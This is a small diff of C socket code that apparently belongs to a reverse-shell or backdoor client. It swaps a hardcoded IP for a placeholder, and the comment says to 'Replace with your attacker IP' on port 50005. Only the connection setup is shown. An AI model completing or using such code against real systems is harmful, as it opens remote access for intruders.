@@ -25,7 +25,7 @@ int main(){
 	}
 	
 	server_address.sin_family=AF_INET;
-	server_address.sin_addr.s_addr = inet_addr("192.168.1.30"); //Replace with your attacker IP
+	server_address.sin_addr.s_addr = inet_addr("SETADDRESSHERE"); //Replace with your attacker IP
 	//Set Free port
 	server_address.sin_port = htons(50005);
 
